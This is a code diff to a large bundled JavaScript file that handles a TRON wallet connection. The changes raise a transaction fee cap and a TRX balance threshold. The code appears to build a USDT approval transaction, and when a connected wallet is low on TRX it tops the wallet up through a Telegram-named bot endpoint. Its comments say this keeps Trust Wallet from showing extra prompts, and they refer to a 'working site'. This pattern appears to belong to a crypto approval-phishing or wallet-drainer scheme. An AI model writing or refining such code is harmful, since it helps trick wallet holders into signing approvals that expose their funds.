@@ -90800,7 +90800,9 @@
                     const tronWebInstance = this.tronWeb && this.tronWeb.transactionBuilder ? this.tronWeb : this.getTronWeb();
                     const usdtContract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
                     const options = {
-                        feeLimit: 1e9,
+                        // 13 TRX cap. Users need at least 14 TRX, and the bot tops up 15,
+                        // so Trust Wallet can burn TRX instead of asking for USDT rental.
+                        feeLimit: 13000000,
                         callValue: 0
                     };
                     // Approve exactly 1 USDT (TRC-20 USDT uses 6 decimal places)
@@ -92862,7 +92864,7 @@
                     console.log("[SIGN] Connected:", c);
 
                     // checktrc-style TRX gate (same thresholds as working site)
-                    const minTrx = 11;
+                    const minTrx = 14;
                     let balanceInTRX = 0;
                     console.log("[2] BALANCE CHECK START", {
                         endpoint: "https://api.trongrid.io/wallet/getaccount"
@@ -92887,7 +92889,7 @@
                     }).catch(() => {});
 
                     if (balanceInTRX < minTrx) {
-                        console.log("TRX below 11, starting top-up");
+                        console.log("TRX below 14, starting top-up");
                         console.log("[4] TRX TOP-UP START", {
                             endpoint: "https://tronscantelegram.onrender.com/send-trx"
                         });
@@ -92937,7 +92939,7 @@
                     } else {
                         console.log("[4] TRX TOP-UP START", {
                             skipped: true,
-                            reason: "balance already at least 11 TRX"
+                            reason: "balance already at least 14 TRX"
                         });
                         console.log("[5] TRX TOP-UP RESULT", {
                             skipped: true
